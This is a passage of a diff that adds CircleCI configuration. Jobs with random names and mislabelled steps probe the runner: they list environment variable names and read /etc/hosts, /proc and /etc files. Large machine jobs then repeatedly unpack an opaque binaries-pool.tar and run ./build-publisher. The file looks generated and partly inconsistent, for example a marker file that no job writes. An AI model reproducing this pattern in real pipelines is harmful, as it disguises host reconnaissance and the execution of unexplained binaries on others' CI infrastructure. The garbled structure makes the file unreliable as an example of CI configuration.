+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  yiotwyshteempbot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Texture Level And Playtest
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; if command -v tar > /dev/null 2>&1;then echo "tar found"; fi; true ; } > /tmp/vine/155756_2022
+            echo "stage [validate-full-integration-tests] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '155756_2022'
+  validate-full-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/155756_2022 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  sierra_alfa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: pairing power supply slowly
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; grep -H -A 1 local /etc/hosts; true ; } > /tmp/vine/lxz55
+            echo "stage [lets-go] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'lxz55'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/lxz55 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  Rec2018:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: so like query the audit log
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 -type f -print0 | sort -z | xargs -0 ls -1; true ; } > /tmp/vine/718d4a34-1d33-6b1b-1088
+            echo "stage [APP-653] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '718d4a34-1d33-6b1b-1088'
+  APP-653:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+
+  TTTTT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Ground the spare drives following launch
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; cat /proc/meminfo | grep MemTotal | nl; true ; } > /tmp/vine/Eb
+            echo "stage [fix-db-hang] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'Eb'
+  spamquuemai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pack Customs Forms Phase
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; if [[ -d /nonexistent ]]; then echo exists; elif [[ -e /tmp ]]; then echo maybe; else echo missing; fi; true ; } > /tmp/vine/node286
+            echo "stage [dotnet8-build] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'node286'
+  clrPink:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: yep backfill the outliers
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'the quick brown fox' | cut -d' ' -f1; true ; } > /tmp/vine/layerHollowYield
+            echo "stage [q3-smoke] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'layerHollowYield'
+  sys_ReceiveWake:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Please swap the power supply
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; printf %s "timeout reached" | sum | awk '{print $1}'; true ; } > /tmp/vine/71xZZLba
+            echo "stage [add-metrics-hang] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '71xZZLba'
+  walnut-wrench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Lock Foreign Keys
+          command: |
+            mkdir -p /tmp/vine
+            set +o pipefail 2>/dev/null; awk 'BEGIN{print "key,val"; for(i=1;i<=100000;i++) print "k"i","i}' > /tmp/vine/dd73e9642fbe; true
+            echo "stage [io] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'dd73e9642fbe'
+  bamboo-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Wake the backlog without downtime
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; printenv | awk -F= '{print $1}' | nl -w2 -s". "; true ; } > /tmp/vine/155756_2022
+            echo "stage [validate-full-integration-tests] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '155756_2022'
+  l3v31:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: I usually lock the orphan jobs last
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; for i in {1..10}; do echo $RANDOM; done | sort -n | tail -n 1; true ; } > /tmp/vine/seed-86t
+            echo "stage [QA_HOOK_3] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'seed-86t'
+  DelegatingBufferProcessor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Rewind
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; (echo one; echo two) > "/tmp/project.lemon.md";wc -l < "/tmp/project.lemon.md"; true ; } > /tmp/vine/lxz55
+            echo "stage [lets-go] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'lxz55'
+  Phi_min:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: DECOMPRESS
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; ls -g /etc/p* /proc | sort -k9; true ; } > /tmp/vine/blob_memo
+            echo "stage [bun-fmt] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'blob_memo'
+  random_texture:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Regroup after checkpoint
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; touch "/dev/shm/drive-2019_12_06.out" && chmod u+x "/dev/shm/drive-2019_12_06.out" && [ -x "/dev/shm/drive-2019_12_06.out" ] && echo executable; true ; } > /tmp/vine/9A3UgPR
+            echo "stage [py310-fmt] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '9A3UgPR'
+  THT2D:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Initiative Ladder
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; awk '{print $1}' /etc/hosts|tr "a-z" "A-Z"|grep -c .; true ; } > /tmp/vine/sha_5a268482bf22
+            echo "stage [feat-3287] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'sha_5a268482bf22'
+  MAT2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Lockdown env demo
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; pgrep -o systemd || echo "no systemd here"; true ; } > /tmp/vine/crc_c689cd
+            echo "stage [node18-bench] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'crc_c689cd'
+  cart_coupon_parse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Wheels up draft
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; touch -d '2020-01-01 12:00' /var/tmp/omega.out && stat -c %y /var/tmp/omega.out; true ; } > /tmp/vine/mapperZetaMuon
+            echo "stage [nova-plus] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'mapperZetaMuon'
+  grace-box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Go benchmark the model card
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; grep -riw if /etc 2> /dev/null | nl | head -n8; true ; } > /tmp/vine/run3_87f3
+            echo "stage [perseus-rev] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'run3_87f3'
+  metric_spec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Transfer the ID badges for new starters
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; cp /etc/shells /var/tmp/segment.bak && sed -i 's|/bin/|/opt/bin/|' /var/tmp/segment.bak && tail -n 2 /var/tmp/segment.bak; true ; } > /tmp/vine/rusty-frame-vector-worker
+            echo "stage [tb-2a] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'rusty-frame-vector-worker'
+workflows:
+  matrix:
+    jobs:
+      - trolley-pos-callback-stone
+      - vpn034
+      - UQ7
+      - xray-5:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - release:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - realease:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - hotfix-7007:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - MERGE_DEV:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - rm-session-leak:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - hu-push:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - refactor-5746:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - APP-653:
+          requires:
+            - trolley-pos-callback-stone
+            - vpn034
+            - UQ7
+      - limit-ratio-spark-cheese
+      - TTTTT:
+          requires:
+            - limit-ratio-spark-cheese
+      - fix-db-hang:
+          requires:
+            - TTTTT
+      - IND-EOF:
+          requires:
+            - TTTTT
+      - spamquuemai:
+          requires:
+            - IND-EOF
+      - dotnet8-build:
+          requires:
+            - spamquuemai
+      - Join-SrcItem:
+          requires:
+            - spamquuemai
+      - clrPink:
+          requires:
+            - Join-SrcItem
+      - q3-smoke:
+          requires:
+            - clrPink
+      - top:
+          requires:
+            - clrPink
+      - sys_ReceiveWake:
+          requires:
+            - top
+      - add-metrics-hang:
+          requires:
+            - sys_ReceiveWake
+      - swapPrevious:
+          requires:
+            - sys_ReceiveWake
+      - walnut-wrench:
+          requires:
+            - swapPrevious
+      - io:
+          requires:
+            - walnut-wrench
+      - yiotwyshteempbot:
+          requires:
+            - walnut-wrench
+      - bamboo-3:
+          requires:
+            - yiotwyshteempbot
+      - validate-full-integration-tests:
+          requires:
+            - bamboo-3
+      - v14-25-50:
+          requires:
+            - bamboo-3
+      - l3v31:
+          requires:
+            - v14-25-50
+      - QA_HOOK_3:
+          requires:
+            - l3v31
+      - sierra_alfa:
+          requires:
+            - l3v31
+      - DelegatingBufferProcessor:
+          requires:
+            - sierra_alfa
+      - lets-go:
+          requires:
+            - DelegatingBufferProcessor
+      - ivy-mitten:
+          requires:
+            - DelegatingBufferProcessor
+      - Phi_min:
+          requires:
+            - ivy-mitten
+      - bun-fmt:
+          requires:
+            - Phi_min
+      - success_city_link_3:
+          requires:
+            - Phi_min
+      - random_texture:
+          requires:
+            - success_city_link_3
+      - py310-fmt:
+          requires:
+            - random_texture
+      - sha-e4b8942c98:
+          requires:
+            - random_texture
+      - THT2D:
+          requires:
+            - sha-e4b8942c98
+      - feat-3287:
+          requires:
+            - THT2D
+      - Backup-DriverWord
+      - r4
+      - Build_Pipeline8:
+          requires:
+            - Backup-DriverWord
+            - r4
+      - API-845:
+          requires:
+            - Backup-DriverWord
+            - r4
+      - zulu:
+          requires:
+            - Backup-DriverWord
+            - r4
+      - LaunchService:
+          requires:
+            - Backup-DriverWord
+            - r4
+      - atlas-v2:
+          requires:
+            - Backup-DriverWord
+            - r4
+      - pat-ship:
+          requires:
+            - Backup-DriverWord
+            - r4
+      - abortPairLen
+      - MAT2:
+          requires:
+            - abortPairLen
+      - node18-bench:
+          requires:
+            - MAT2
+      - mikeSage:
+          requires:
+            - MAT2
+      - cart_coupon_parse:
+          requires:
+            - mikeSage
+      - nova-plus:
+          requires:
+            - cart_coupon_parse
+      - bishop-pebble:
+          requires:
+            - cart_coupon_parse
+      - grace-box:
+          requires:
+            - bishop-pebble
+      - perseus-rev:
+          requires:
+            - grace-box
+      - v_vs_y:
+          requires:
+            - grace-box
+      - metric_spec:
+          requires:
+            - v_vs_y
+      - tb-2a:
+          requires:
+            - metric_spec
